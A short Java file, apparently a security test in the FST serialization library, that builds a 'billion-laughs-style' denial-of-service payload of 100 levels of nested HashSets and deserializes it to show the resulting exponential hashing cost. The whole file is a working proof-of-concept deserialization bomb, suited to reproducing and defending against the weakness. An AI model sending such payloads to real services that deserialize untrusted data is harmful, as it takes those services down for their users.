package ser.security;

import org.nustaq.serialization.FSTConfiguration;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashSet;
import java.util.Set;


/**
 * Created by ruedi on 22/11/15.
 *
 * DOS attack
 */
public class NestedHS {
    private static final boolean USEFST = true;
    static FSTConfiguration conf = FSTConfiguration.createDefaultConfiguration();

// billion-laughs-style DoS for java serialization

    public static void main(String[] args) throws Exception {
        deserialize(payload());
    }

    static Object deserialize(byte[] bytes) throws Exception {
        if (USEFST) {
            return conf.asObject(bytes);
        }
        return new ObjectInputStream(new ByteArrayInputStream(bytes)).readObject();
    }

    static byte[] payload() throws IOException {
        Set root = new HashSet();
        Set s1 = root;
        Set s2 = new HashSet();
        for (int i = 0; i < 100; i++) {
            Set t1 = new HashSet();
            Set t2 = new HashSet();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }

    static byte[] serialize(Object o) throws IOException {
        if (USEFST) {
            return conf.asByteArray(o);
        }
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(ba);
        oos.writeObject(o);
        oos.close();
        return ba.toByteArray();
    }

}
